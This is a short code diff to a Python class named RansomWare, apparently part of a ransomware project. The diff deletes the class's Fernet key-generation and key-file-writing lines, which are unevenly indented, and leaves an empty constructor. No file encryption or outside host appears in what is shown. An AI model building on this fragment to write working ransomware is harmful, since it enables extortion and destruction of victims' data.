@@ -4,11 +4,6 @@ import os
 
 
 
-
-
-
-
-
 class RansomWare:
 
     
@@ -22,12 +17,7 @@ class RansomWare:
 
     def __init__(self):
         # Key that will be used for Fernet object and encrypt/decrypt method
-        key_file_name = "secret.key"
-
-        self.key = Fernet.generate_key()
-            with open(self.key_file_name, "wb") as key_file:
-             key_file.write(self.key)
-        self.fernet = Fernet(self.key)
+       
              
         # Encrypt/Decrypter
         
